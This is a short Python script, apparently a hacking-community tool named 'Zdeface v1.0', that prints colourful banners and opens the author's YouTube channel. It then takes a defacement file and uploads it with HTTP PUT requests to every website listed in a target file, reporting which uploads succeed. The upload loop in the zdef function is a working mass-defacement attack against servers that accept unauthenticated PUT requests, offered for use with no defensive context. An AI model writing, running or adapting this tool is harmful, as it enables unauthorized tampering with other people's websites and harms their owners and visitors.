#-*- coding: utf-8 -*-

try:
   import requests
   import os
   import time
   import os.path
   import sys
except ImportError:
   exit("\033[90mZrawhBOT: \033[1;31minstall requests and try again ...")
os.system('clear')
time.sleep(1.0)
print('''\033[93████████╗██╗   ██╗██████╗ ███████╗ ██████╗██████╗ ██╗██████╗ ███████╗
██╔════╝██║   ██║██╔══██╗██╔════╝██╔════╝██╔══██╗██║██╔══██╗██╔════╝
███████╗██║   ██║██████╔╝███████╗██║     ██████╔╝██║██████╔╝█████╗  
╚════██║██║   ██║██╔══██╗╚════██║██║     ██╔══██╗██║██╔══██╗██╔══╝  
███████║╚██████╔╝██████╔╝███████║╚██████╗██║  ██║██║██████╔╝███████╗
╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝''')
time.sleep(1.0)
print ('''\033[94m████████╗ ██████╗ 
╚══██╔══╝██╔═══██╗
   ██║   ██║   ██║
   ██║   ██║   ██║
   ██║   ╚██████╔╝
   ╚═╝    ╚═════╝''')
time.sleep(1.0)
print('''\033[95m███╗   ███╗██╗   ██╗
████╗ ████║╚██╗ ██╔╝
██╔████╔██║ ╚████╔╝ 
██║╚██╔╝██║  ╚██╔╝  
██║ ╚═╝ ██║   ██║   
╚═╝     ╚═╝   ╚═╝''')
time.sleep(1.0)
print('''\033[32m
 ██████╗██╗  ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██╗     
██╔════╝██║  ██║██╔══██╗████╗  ██║████╗  ██║██╔════╝██║     
██║     ███████║███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
██║     ██╔══██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
╚██████╗██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗███████╗
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝''')
os.system('xdg-open http://youtube.com/c/zrawh')
os.system('clear')
banner = """
\033[1;31m\033[1;37m 

███████╗██████╗ ███████╗███████╗ █████╗  ██████╗███████╗ Author : Zrawh
╚══███╔╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝ Date   : 2020-5-9
  ███╔╝ ██║  ██║█████╗  █████╗  ███████║██║     █████╗   Tools  : Zdeface v1.0
 ███╔╝  ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝   Github : zrawhgt
███████╗██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗ YouTube: Zrawh
\033[1;31m╚══════╝╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(anjay):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(anjay)
   else:
      ipt = raw_input(anjay)
   
   return str(ipt)

def zdef(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("\033[90mZrawhBOT: \033[1;31muploading file to %d website"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"\033[90mZrawhBOT: \033[0m[\033[1;31m FAILED! \033[0m]\033[1;31m %s/%s"%(site,script))
            else:
               print(m+"\033[90mZrawhBOT: \033[0m[\033[92m SUCCESS \033[0m]\033[92m %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("\033[90mZrawhBOT: \033[1;31mEnter your script deface name: ")
         if not os.path.isfile(a):
            print("\033[90mZrawhBOT: \033[1;31mfile '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   zdef(a)

if __name__ == "__main__":
    main(banner)
